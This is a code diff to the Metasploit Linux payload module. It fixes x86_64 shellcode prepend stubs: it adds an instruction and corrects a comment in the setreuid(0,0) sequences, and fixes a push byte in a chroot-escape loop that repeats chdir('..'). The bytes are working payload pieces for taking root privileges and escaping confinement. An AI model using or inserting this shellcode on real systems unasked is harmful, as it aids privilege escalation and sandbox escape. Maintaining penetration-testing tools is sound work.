@@ -223,6 +223,7 @@ module Msf::Payload::Linux
 				# setreuid(0, 0)
                                 pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
                                 pre << "\x48\x89\xfe"         #    mov     rsi,rdi                   #
+                                pre << "\x48\x89\xf2"         #    mov     rdx,rsi                   #
                                 pre << "\x6a\x71"             #    push    0x71                      #
                                 pre << "\x58"                 #    pop     rax                       #
                                 pre << "\x0f\x05"             #    syscall                           #
@@ -241,7 +242,7 @@ module Msf::Payload::Linux
 
 				# setreuid(0, 0)
                                 pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
-                                pre << "\x48\x89\xfe"         #    mov     rax,rdi                   #
+                                pre << "\x48\x89\xfe"         #    mov     rsi,rdi                   #
                                 pre << "\x48\x89\xf8"         #    mov     rax,rdi                   #
                                 pre << "\xb0\x71"             #    mov     al,0x71                   #
                                 pre << "\x0f\x05"             #    syscall                           #
@@ -272,7 +273,7 @@ module Msf::Payload::Linux
 
                                 # loop chdir(..) 69 times
                                 # syscall tendo to modify rcx can't use loop...
-                                pre << "\x6a\x69"             #    push    0x45                      #
+                                pre << "\x6a\x45"             #    push    0x45                      #
                                 pre << "\x5b"                 #    pop     rbx                       #
                                 pre << "\x6a\x50"             #    push    0x50                      #
                                 pre << "\x58"                 #    pop     rax                       #
